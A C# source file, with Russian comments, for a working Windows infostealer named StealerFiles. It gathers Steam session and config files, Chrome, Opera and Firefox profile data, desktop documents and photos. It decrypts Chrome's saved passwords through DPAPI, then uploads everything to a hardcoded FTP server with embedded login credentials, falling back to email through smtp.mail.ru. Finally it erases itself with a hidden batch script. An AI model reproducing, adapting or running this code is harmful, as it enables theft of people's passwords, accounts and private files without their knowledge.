using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Reflection;
using System.IO.Compression;
using System.Collections.Generic;
using System.Net.Mail;
using System.Net.Mime;
using System.Diagnostics;
using System.Windows.Forms;

namespace StealerFiles
{
    class Settings
    {
        //Расширения
        static public String[] Extensions = { ".exe", ".doc", ".xls", ".docx", ".xlsx", ".png", ".jpeg", ".jpg" };

        //Рабочая папка на сервере
        static public DateTime date = DateTime.Now;
        static public string workingDir = Environment.UserName;

        //Размеры
        static public int kb = 1024;
        static public int mb = kb * 1024;
        static public int gb = mb * 1024;

        //Режим работы
        static public Boolean FTP = true;

        //Параметры почты
        static public string mailLogin = "";
        static public string mailPass = "";
        static public string mailTo = "";
        static public string mailFrom = "";
        static public string mailThem = "Files Upload! (" + Environment.UserName + " - " + date.ToString("MM_dd_yyyy HH:mm") + ")";
        static public string mailServ = "smtp.mail.ru";
        static public string mailBody = "";
        static public int mailPort = 2525; 


        //Параметры подключения
        static public string _UserName = "y29766";
        static public string _Password = "MsPM3r*O$*SVZAC7";
        static public string _Host = "hostde7.fornex.org/public_html/Steam";

        //Пути к важным папкам
        static public DirectoryInfo dirUser = new DirectoryInfo("C:/Users/" + Environment.UserName + "/");
        static public DirectoryInfo dirMozzilaFiles = new DirectoryInfo("C:/Users/" + Environment.UserName + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + new DirectoryInfo("C:/Users/" + Environment.UserName + "/AppData/Roaming/Mozilla/Firefox/Profiles/").GetDirectories()[0] + "/");//папка с файлами мозилы
        static public DirectoryInfo dirGooglechromeFiles = new DirectoryInfo("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/");
        static public DirectoryInfo dirOperaFiles = new DirectoryInfo("C:/Users/" + Environment.UserName + "/AppData/Roaming/Opera Software/Opera Stable");
        static public DirectoryInfo dirFoto = new DirectoryInfo("C:/Users/" + Environment.UserName + "/Pictures/");
        static public DirectoryInfo dirDecstop = new DirectoryInfo("C:/Users/" + Environment.UserName + "/Desktop/");

        static public String steamFolderName = "Steam";
        static public String steamConfigFolder = "/config";
        //Фалы для удаления
        static public List<FileInfo> delFile = new List<FileInfo>();

        #region Отчёт
        static private List<String> report = new List<String>();

        static public void addError(Exception e, String s)
        {
            report.Add("ERROR!   " + s + "  error(" + e.Message + ");");
        }

        static public void addError(String s)
        {
            report.Add("!ERROR!  " + s);
        }

        static public void addReport(String s)
        {
            report.Add(s);
        }

        static public List<String> getReports()
        {
            return report;
        }
        #endregion
    }
    class Stealer
    {
        SmtpClient client;
        MailMessage msg;

        public Stealer()
        {
            try
            {
                testFTP("/", Environment.UserName);
            }
            catch
            {
                Settings.FTP = false;
                Settings.addReport("FTP is not available. All files will be sent by email.");
            }

            client = new SmtpClient(Settings.mailServ, Settings.mailPort);
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential(Settings.mailLogin, Settings.mailPass);
            string msgFrom = Settings.mailFrom; // Указываем поле, от кого письмо 
            string msgTo = Settings.mailTo; // Указываем поле, кому письмо будет отправлено 
            string msgSubject = Settings.mailThem; // Указываем тему пиьсма
            string msgBody = Settings.mailBody; // Тут мы формируем тело письма
            msg = new MailMessage(msgFrom, msgTo, msgSubject, msgBody);

            CreateDirectory("/" + Settings.workingDir + "/", Settings.date.ToString("MM_dd_yyyy HH:mm"));
            Settings.workingDir += "/" + Settings.date.ToString("MM_dd_yyyy HH:mm");

            Steam(Settings.workingDir + "/Steam");

            UploadDir(Settings.dirGooglechromeFiles, Settings.workingDir + "/GoogleChrome",0);
            UploadDir(Settings.dirOperaFiles, Settings.workingDir + "/Opera", 0);
            UploadDir(Settings.dirMozzilaFiles, Settings.workingDir + "/Mozila", 0);
            UploadDir(Settings.dirDecstop, Settings.workingDir + "/TxtOnDecstop", 2);
            UploadDir(Settings.dirFoto, Settings.workingDir + "/Foto", 0);

            UploadMailFile();

            foreach (FileInfo f in Settings.delFile) File.Delete(f.FullName);
            Console.WriteLine("Ready!");
            delApp();
        }

        //Delete
        private void delApp()
        {
            string aep = Application.ExecutablePath;
            //Console.WriteLine(aep);System.Data.SQLite.dll
            string[] test = { ":Repeat", "del \"selfdelete.EXE\"", "if exist \"selfdelete.EXE\" goto Repeat", "del \"System.Data.SQLite.DLL\"", "if exist \"System.Data.SQLite.DLL\" goto Repeat", "del delete.bat" };
            test[1] = "del \"" + aep.Split('\\')[aep.Split('\\').Length - 1] + "\"";
            test[2] = "if exist \"" + aep.Split('\\')[aep.Split('\\').Length - 1] + "\" goto Repeat";
            System.IO.FileInfo fi = new System.IO.FileInfo(Application.StartupPath + @"\delete.bat");
            System.IO.StreamWriter sw = fi.CreateText();
            for (int i = 0; i < test.Length; i++)
            {
                sw.WriteLine(test[i]);
            }
            sw.Close();
            System.Diagnostics.ProcessStartInfo start =
            new System.Diagnostics.ProcessStartInfo();
            start.FileName = Application.StartupPath + @"\delete.bat";
            start.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            Process.Start(start);
            Application.Exit();
        }
        //AllFolders
        private void UploadDir(DirectoryInfo d, String locate, int level)
        {
            try
            {
                foreach (FileInfo f in Dir(d, level))
                {
                    if (f.Name.Equals("Login Data"))
                    {
                        UploadFile(f.FullName.Replace(d.FullName, ""), deskrypt(f.FullName.Replace('\\', '/')) , locate);
                    }
                    else
                    {
                        if (f.Length / (float)Settings.mb < 2 * Settings.mb)
                        {
                            if (Array.Find(Settings.Extensions, s => s.Equals(f.Extension)) != null)
                            {
                                UploadFile(f.FullName,f.FullName.Replace(d.FullName, ""), locate);
                            }
                        }
                        else
                        {
                            Settings.addReport("File '" + f.FullName + "' > 2 mb (" + f.Length / (float) Settings.mb + ")");
                        }
                    }    
                }
            }
            catch (Exception e)
            {
                Settings.addError(e, locate.Split('/')[locate.Split('/').Length - 1]);
            }
        }
        private List<FileInfo> Dir(DirectoryInfo d, int level)
        {
            List<FileInfo> l = new List<FileInfo>();
            l.AddRange(d.GetFiles());
            if (level != 0) foreach (DirectoryInfo d2 in d.GetDirectories()) l.AddRange(Dir(d2, level - 1));
            return l;
        }
        //Steam
        private void Steam(String locate)
        {
            DirectoryInfo steam = null;
            //Поиск папки
            foreach(DriveInfo drive in DriveInfo.GetDrives())
            {
                steam = DirSteam(new DirectoryInfo(drive.Name));
                //Console.WriteLine(drive.Name);
                if (steam != null)
                {
                    //Console.WriteLine(steam.FullName);
                    break;
                }
            }
            if(steam != null)
            {
                foreach(FileInfo f in steam.GetFiles())
                {
                    if (f.Name.IndexOf("ssfn") != -1) UploadFile(f.FullName, f.FullName.Replace(steam.FullName, ""), locate);
                }
                foreach(FileInfo f in new DirectoryInfo(steam.FullName + Settings.steamConfigFolder).GetFiles())
                {
                    UploadFile(f.FullName, f.FullName.Replace(steam.FullName, ""), locate);
                }
            }
            else
            {
                Settings.addError("Steam is not instaled!");
                return;
            }         
        }
        private DirectoryInfo DirSteam(DirectoryInfo d)
        {
            try {
                foreach (DirectoryInfo d2 in d.GetDirectories())
                {
                    //Console.WriteLine(d2.FullName);
                    if (d2.Name.Equals(Settings.steamFolderName))
                    {
                        if (Array.Find(d2.GetFiles(), x => x.Name.Equals("Steam.exe")) != null)
                        return d2;
                    }
                    DirectoryInfo d3 = DirSteam(d2);
                    if (d3 != null) return d3;
                }
            }
            catch
            {

            }
            return null;
        }
        //FTP
        private void CreateDirectory(string path, string folderName)
        {
            FtpWebRequest ftpRequest;
            String ftpFullPath = "ftp://" + Settings._Host + path + folderName + "/";
            try
            {
                ftpRequest = (FtpWebRequest)FtpWebRequest.Create(ftpFullPath);
                ftpRequest.Credentials = new NetworkCredential(Settings._UserName, Settings._Password);
                ftpRequest.EnableSsl = false;
                ftpRequest.KeepAlive = false;
                ftpRequest.UseBinary = true;
                ftpRequest.Proxy = null;
                ftpRequest.Method = WebRequestMethods.Ftp.ListDirectory;
                FtpWebResponse resp = (FtpWebResponse)ftpRequest.GetResponse();
                resp.Close();
            }
            catch
            {
                try
                {
                    ftpRequest = (FtpWebRequest)FtpWebRequest.Create(ftpFullPath);
                    ftpRequest.Credentials = new NetworkCredential(Settings._UserName, Settings._Password);
                    ftpRequest.EnableSsl = false;
                    ftpRequest.KeepAlive = false;
                    ftpRequest.UseBinary = true;
                    ftpRequest.Proxy = null;
                    ftpRequest.Method = WebRequestMethods.Ftp.MakeDirectory;
                    FtpWebResponse resp = (FtpWebResponse)ftpRequest.GetResponse();
                    resp.Close();
                }
                catch
                {

                }
            }
        }
        private void CopyFile(string sourceFilePath, string destinationFilePath)
        {
            FileStream reader = null;
            FileStream writer = null;
            try
            {
                reader = File.Open(sourceFilePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                writer = File.Create(destinationFilePath);
                int bufferSize = 1024;
                int hasReaded = 0;
                byte[] buffer = new byte[bufferSize];
                while (reader.Position < reader.Length)
                {
                    hasReaded = reader.Read(buffer, 0, bufferSize);
                    writer.Write(buffer, 0, hasReaded);
                }
            }
            catch (IOException e)
            {
                Console.WriteLine(e.Message);
            }
            reader.Close();
            writer.Close();
        }
        private void UploadFile(String f ,String folderNameOnPc, String folderOnFTP)
        {
            if (Settings.FTP)
            {
                string fileOnPc = f;
                f = folderNameOnPc.Replace('\\', '/');
                folderOnFTP = folderOnFTP.Replace('\\', '/');

                FtpWebRequest ftpRequest;
                String path = folderOnFTP.Remove(folderOnFTP.LastIndexOf('/'), folderOnFTP.Length - folderOnFTP.LastIndexOf('/'));
                String folderName = folderOnFTP.Replace(path + "/", "");

                CreateDirectory("/" + path + "/", folderName);
                path += "/" + folderName;

                String fileName;
                if (f.LastIndexOf('/') != -1)
                {
                    fileName = f.Remove(0, f.LastIndexOf('/') + 1);
                }
                else
                {
                    fileName = f;
                }

                if (f.Replace(fileName, "").Split('/').Length != 1)
                {
                    foreach (string dir in f.Replace(fileName, "").Split('/'))
                    {
                        if (!dir.Equals(""))
                        {
                            CreateDirectory("/" + path + "/", dir);
                            path += "/" + dir;
                        }
                    }
                }
                //Console.WriteLine(path);

                FileStream uploadedFile;
                try {
                    try
                    {
                        uploadedFile = new FileStream(fileOnPc, FileMode.Open, FileAccess.Read);
                    }
                    catch
                    {
                        CopyFile(fileName, fileOnPc + "2");
                        uploadedFile = new FileStream(fileOnPc + "2", FileMode.Open, FileAccess.Read);
                    }
                  //  Console.WriteLine(fileOnPc);
                    ftpRequest = (FtpWebRequest)WebRequest.Create("ftp://" + Settings._Host + "/" + path + "/" + fileName);
                    ftpRequest.Credentials = new NetworkCredential(Settings._UserName, Settings._Password);
                    ftpRequest.EnableSsl = false;
                    ftpRequest.Method = WebRequestMethods.Ftp.UploadFile;

                    //Console.WriteLine("qwe");

                    //Буфер для загружаемых данных
                    byte[] file_to_bytes = new byte[uploadedFile.Length];
                    //Считываем данные в буфер
                    uploadedFile.Read(file_to_bytes, 0, file_to_bytes.Length);

                    uploadedFile.Close();
                    //Console.WriteLine("qwe2");
                    //Поток для загрузки файла
                    //Console.WriteLine(Settings._Host);
                    //Console.WriteLine(path);
                    //Console.WriteLine(fileName);
                    Stream writer = ftpRequest.GetRequestStream();
                    //Console.WriteLine("qwe3");
                    writer.Write(file_to_bytes, 0, file_to_bytes.Length);
                    //Console.WriteLine("qwe4");
                    writer.Close();
                    //Console.WriteLine("qwe5");
                }
                catch
                {
                    AddMailFile(f);
                }
            }
            else
            {
                AddMailFile(f);
            }
        }
        private void UploadFile(string pathOnServer, List<String> listname, String folderOnFTP)
        {
            if (Settings.FTP)
            {
                pathOnServer = pathOnServer.Replace('\\', '/');
                folderOnFTP = folderOnFTP.Replace('\\', '/');

                String path = folderOnFTP.Remove(folderOnFTP.LastIndexOf('/'), folderOnFTP.Length - folderOnFTP.LastIndexOf('/'));
                String folderName = folderOnFTP.Replace(path + "/", "");

                String fileName;
                if (pathOnServer.LastIndexOf('/') != -1)
                {
                    fileName = pathOnServer.Remove(0, pathOnServer.LastIndexOf('/') + 1);
                }
                else
                {
                    fileName = pathOnServer;
                }



                CreateDirectory("/" + path + "/", folderName);
                path += "/" + folderName;

                if (pathOnServer.Replace(fileName, "").Split('/').Length != 1)
                {
                    foreach (string dir in pathOnServer.Replace(fileName, "").Split('/'))
                    {
                        if (!dir.Equals(""))
                        {
                            CreateDirectory("/" + path + "/", dir);
                            path += "/" + dir;
                        }
                    }
                }
                Console.WriteLine("ftp://" + Settings._Host + "/" + path + "/" + fileName + ".txt");
                FtpWebRequest ftpRequest;
                try
                {
                    ftpRequest = (FtpWebRequest)WebRequest.Create("ftp://" + Settings._Host + "/" + path + "/" + fileName + ".txt");
                    ftpRequest.Credentials = new NetworkCredential(Settings._UserName, Settings._Password);
                    ftpRequest.EnableSsl = false;
                    ftpRequest.Method = WebRequestMethods.Ftp.UploadFile;

                    String uot = "";
                    foreach (String str in listname)
                    {
                        uot += str + "\n";
                    }
                    //Буфер для загружаемых данных
                    byte[] file_to_bytes = Encoding.UTF8.GetBytes(uot);//new byte[uploadedFile.Length];
                                                                       //Считываем данные в буфер

                    //Поток для загрузки файла 
                    Stream writer = ftpRequest.GetRequestStream();

                    writer.Write(file_to_bytes, 0, file_to_bytes.Length);
                    writer.Close();
                }
                catch (Exception e)
                {

                }
            }
            else
            {
                AddMailFile(listname, folderOnFTP);
            }
        }
        private void testFTP(string path, string folderName)
        {
            FtpWebRequest ftpRequest;
            String ftpFullPath = "ftp://" + Settings._Host + path + folderName + "/";
            try
            {
                ftpRequest = (FtpWebRequest)FtpWebRequest.Create(ftpFullPath);
                ftpRequest.Credentials = new NetworkCredential(Settings._UserName, Settings._Password);
                ftpRequest.EnableSsl = false;
                ftpRequest.KeepAlive = false;
                ftpRequest.UseBinary = true;
                ftpRequest.Proxy = null;
                ftpRequest.Method = WebRequestMethods.Ftp.ListDirectory;
                FtpWebResponse resp = (FtpWebResponse)ftpRequest.GetResponse();
                resp.Close();
            }
            catch
            {
                ftpRequest = (FtpWebRequest)FtpWebRequest.Create(ftpFullPath);
                ftpRequest.Credentials = new NetworkCredential(Settings._UserName, Settings._Password);
                ftpRequest.EnableSsl = false;
                ftpRequest.KeepAlive = false;
                ftpRequest.UseBinary = true;
                ftpRequest.Proxy = null;
                ftpRequest.Method = WebRequestMethods.Ftp.MakeDirectory;
                FtpWebResponse resp = (FtpWebResponse)ftpRequest.GetResponse();
                resp.Close();
            }
        }
        //Mail
        private void UploadMailFile()
        {
            if(msg.Attachments.Count == 0)
            {
                msg.Subject = "All filis upload to FTP!";
            }
            try
            {
                if (Settings.getReports().Count == 0)
                {
                    msg.Body = "All good!";
                }
                else {
                    string rep = "";
                    foreach (string s in Settings.getReports())
                    {
                        rep += s + "\n";
                    }
                    msg.Body = rep;
                }
                client.Send(msg); // Отправляем письмо
                msg.Dispose();
                client.Dispose(); 
            }
            catch
            {
                Console.WriteLine("error");
            }
        }
        private void AddMailFile(List<String> listname, String folderOnFTP)
        {
            folderOnFTP = folderOnFTP.Replace('\\', '/');
            string fileName = folderOnFTP.Remove(0, folderOnFTP.LastIndexOf("/") + 1) + ".txt";
            using (StreamWriter s = new StreamWriter(Settings.dirUser + fileName, false))
            {
                foreach (string str in listname) s.WriteLine(str);
            }
            msg.Attachments.Add(new Attachment(Settings.dirUser + fileName, MediaTypeNames.Text.RichText));
            Settings.delFile.Add(new FileInfo(Settings.dirUser + fileName));
        }
        private void AddMailFile(String f)
        {
            msg.Attachments.Add(new Attachment(f, MediaTypeNames.Text.RichText));
        }
        //Decripting
        private List<String> deskrypt(String pathFile)
        {
            List<String> l = new List<String>();
            try
            {
                string db_way = pathFile;
                
                SQLiteConnectionStringBuilder con = new SQLiteConnectionStringBuilder();
                con.DataSource = db_way;
                byte[] entropy = null;
                string description;
                DataTable DB = new DataTable();
                string sql = "SELECT * FROM logins";
                using (var connection = new SQLiteConnection(con.ConnectionString))
                {
                    using (var command = new SQLiteCommand(sql, connection))
                    {
                        command.Connection.Open();
                        command.ExecuteNonQuery();

                        SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                        adapter.Fill(DB);
                        int rows = DB.Rows.Count;
                        if (rows == 0)
                        {
                            l.Add("There are no items");
                            return l;
                        }
                        else
                        {
                            for (int i = 0; i < rows; i++)
                            {
                                String s = "";
                                s += "[" + (i + 1) + "] - ";
                                s += "Site: " + DB.Rows[i][1] + "; ";
                                s += "Login: " + DB.Rows[i][3] + "; ";
                                byte[] byteArray = (byte[])DB.Rows[i][5];
                                byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                                string password = new UTF8Encoding(true).GetString(decrypted);
                                s += "Password: " + password + ";";
                                l.Add(s);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                l.Add("Error");
                ex = ex.InnerException;
            }
            return l;
        }
    }
    public class DPAPI
    {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
            bool CryptProtectData(ref DATA_BLOB pPlainText, string szDescription, ref DATA_BLOB pEntropy, IntPtr pReserved,
                                             ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pCipherText);

        [DllImport("crypt32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
        private static extern
            bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy,
                  IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        static private IntPtr NullPtr = ((IntPtr)((int)(0)));

        private const int CRYPTPROTECT_UI_FORBIDDEN = 0x1;
        private const int CRYPTPROTECT_LOCAL_MACHINE = 0x4;

        private static void InitPrompt(ref CRYPTPROTECT_PROMPTSTRUCT ps)
        {
            ps.cbSize = Marshal.SizeOf(
                                      typeof(CRYPTPROTECT_PROMPTSTRUCT));
            ps.dwPromptFlags = 0;
            ps.hwndApp = NullPtr;
            ps.szPrompt = null;
        }

        private static void InitBLOB(byte[] data, ref DATA_BLOB blob)
        {
            // Use empty array for null parameter.
            if (data == null)
                data = new byte[0];

            // Allocate memory for the BLOB data.
            blob.pbData = Marshal.AllocHGlobal(data.Length);

            // Make sure that memory allocation was successful.
            if (blob.pbData == IntPtr.Zero)
                throw new Exception(
                    "Unable to allocate data buffer for BLOB structure.");

            // Specify number of bytes in the BLOB.
            blob.cbData = data.Length;

            // Copy data from original source to the BLOB structure.
            Marshal.Copy(data, 0, blob.pbData, data.Length);
        }

        public enum KeyType { UserKey = 1, MachineKey };

        private static KeyType defaultKeyType = KeyType.UserKey;

        public static string Encrypt(string plainText)
        {
            return Encrypt(defaultKeyType, plainText, String.Empty, String.Empty);
        }

        public static string Encrypt(KeyType keyType, string plainText)
        {
            return Encrypt(keyType, plainText, String.Empty,
                            String.Empty);
        }

        public static string Encrypt(KeyType keyType, string plainText, string entropy)
        {
            return Encrypt(keyType, plainText, entropy, String.Empty);
        }

        public static string Encrypt(KeyType keyType, string plainText, string entropy, string description)
        {
            // Make sure that parameters are valid.
            if (plainText == null) plainText = String.Empty;
            if (entropy == null) entropy = String.Empty;

            // Call encryption routine and convert returned bytes into
            // a base64-encoded value.
            return Convert.ToBase64String(
                    Encrypt(keyType,
                            Encoding.UTF8.GetBytes(plainText),
                            Encoding.UTF8.GetBytes(entropy),
                            description));
        }

        public static byte[] Encrypt(KeyType keyType, byte[] plainTextBytes, byte[] entropyBytes, string description)
        {
            // Make sure that parameters are valid.
            if (plainTextBytes == null) plainTextBytes = new byte[0];
            if (entropyBytes == null) entropyBytes = new byte[0];
            if (description == null) description = String.Empty;

            // Create BLOBs to hold data.
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB cipherTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();

            // We only need prompt structure because it is a required
            // parameter.
            CRYPTPROTECT_PROMPTSTRUCT prompt =
                                      new CRYPTPROTECT_PROMPTSTRUCT();
            InitPrompt(ref prompt);

            try
            {
                // Convert plaintext bytes into a BLOB structure.
                try
                {
                    InitBLOB(plainTextBytes, ref plainTextBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize plaintext BLOB.", ex);
                }

                // Convert entropy bytes into a BLOB structure.
                try
                {
                    InitBLOB(entropyBytes, ref entropyBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize entropy BLOB.", ex);
                }

                // Disable any types of UI.
                int flags = CRYPTPROTECT_UI_FORBIDDEN;

                // When using machine-specific key, set up machine flag.
                if (keyType == KeyType.MachineKey)
                    flags |= CRYPTPROTECT_LOCAL_MACHINE;

                // Call DPAPI to encrypt data.
                bool success = CryptProtectData(ref plainTextBlob,
                                                    description,
                                                ref entropyBlob,
                                                    IntPtr.Zero,
                                                ref prompt,
                                                    flags,
                                                ref cipherTextBlob);
                // Check the result.
                if (!success)
                {
                    // If operation failed, retrieve last Win32 error.
                    int errCode = Marshal.GetLastWin32Error();

                    // Win32Exception will contain error message corresponding
                    // to the Windows error code.
                    throw new Exception(
                        "CryptProtectData failed.", new Win32Exception(errCode));
                }

                // Allocate memory to hold ciphertext.
                byte[] cipherTextBytes = new byte[cipherTextBlob.cbData];

                // Copy ciphertext from the BLOB to a byte array.
                Marshal.Copy(cipherTextBlob.pbData,
                                cipherTextBytes,
                                0,
                                cipherTextBlob.cbData);

                // Return the result.
                return cipherTextBytes;
            }
            catch (Exception ex)
            {
                throw new Exception("DPAPI was unable to encrypt data.", ex);
            }
            // Free all memory allocated for BLOBs.
            finally
            {
                if (plainTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(plainTextBlob.pbData);

                if (cipherTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(cipherTextBlob.pbData);

                if (entropyBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(entropyBlob.pbData);
            }
        }

        public static string Decrypt(string cipherText)
        {
            string description;

            return Decrypt(cipherText, String.Empty, out description);
        }

        public static string Decrypt(string cipherText, out string description)
        {
            return Decrypt(cipherText, String.Empty, out description);
        }

        public static string Decrypt(string cipherText, string entropy, out string description)
        {
            // Make sure that parameters are valid.
            if (entropy == null) entropy = String.Empty;

            return Encoding.UTF8.GetString(
                        Decrypt(Convert.FromBase64String(cipherText),
                                    Encoding.UTF8.GetBytes(entropy),
                                out description));
        }

        public static byte[] Decrypt(byte[] cipherTextBytes, byte[] entropyBytes, out string description)
        {
            // Create BLOBs to hold data.
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB cipherTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();

            // We only need prompt structure because it is a required
            // parameter.
            CRYPTPROTECT_PROMPTSTRUCT prompt =
                                      new CRYPTPROTECT_PROMPTSTRUCT();
            InitPrompt(ref prompt);

            // Initialize description string.
            description = String.Empty;

            try
            {
                // Convert ciphertext bytes into a BLOB structure.
                try
                {
                    InitBLOB(cipherTextBytes, ref cipherTextBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize ciphertext BLOB.", ex);
                }

                // Convert entropy bytes into a BLOB structure.
                try
                {
                    InitBLOB(entropyBytes, ref entropyBlob);
                }
                catch (Exception ex)
                {
                    throw new Exception(
                        "Cannot initialize entropy BLOB.", ex);
                }

                // Disable any types of UI. CryptUnprotectData does not
                // mention CRYPTPROTECT_LOCAL_MACHINE flag in the list of
                // supported flags so we will not set it up.
                int flags = CRYPTPROTECT_UI_FORBIDDEN;

                // Call DPAPI to decrypt data.
                bool success = CryptUnprotectData(ref cipherTextBlob,
                                                  ref description,
                                                  ref entropyBlob,
                                                      IntPtr.Zero,
                                                  ref prompt,
                                                      flags,
                                                  ref plainTextBlob);

                // Check the result.
                if (!success)
                {
                    // If operation failed, retrieve last Win32 error.
                    int errCode = Marshal.GetLastWin32Error();

                    // Win32Exception will contain error message corresponding
                    // to the Windows error code.
                    throw new Exception(
                        "CryptUnprotectData failed.", new Win32Exception(errCode));
                }

                // Allocate memory to hold plaintext.
                byte[] plainTextBytes = new byte[plainTextBlob.cbData];

                // Copy ciphertext from the BLOB to a byte array.
                Marshal.Copy(plainTextBlob.pbData,
                             plainTextBytes,
                             0,
                             plainTextBlob.cbData);

                // Return the result.
                return plainTextBytes;
            }
            catch (Exception ex)
            {
                throw new Exception("DPAPI was unable to decrypt data.", ex);
            }
            // Free all memory allocated for BLOBs.
            finally
            {
                if (plainTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(plainTextBlob.pbData);

                if (cipherTextBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(cipherTextBlob.pbData);

                if (entropyBlob.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(entropyBlob.pbData);
            }
        }
    }
}